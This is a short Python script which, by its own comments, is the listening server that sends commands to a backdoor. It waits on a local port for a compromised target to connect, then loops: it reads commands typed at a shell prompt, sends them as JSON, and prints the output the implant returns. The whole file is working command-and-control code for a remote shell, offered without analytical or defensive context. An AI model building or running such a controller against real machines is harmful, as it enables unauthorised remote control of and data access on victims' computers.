#server that sends commands to the backdoor
#run me first
import socket
import json
from ctypes.wintypes import INT

ip = '127.0.0.1'
port = 4141

server = socket.socket()
server.bind((ip, port))
print('listening For target connection ...')
server.listen(1)
target, client_addr = server.accept()
print(f'[+] {client_addr} connected')

def send_command(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def receive_response():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# send commands and receive output in loop
def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        send_command(command)
        output = receive_response()
        print(f"output: {output}")
        if command == "quit":
            break
        
target_communication()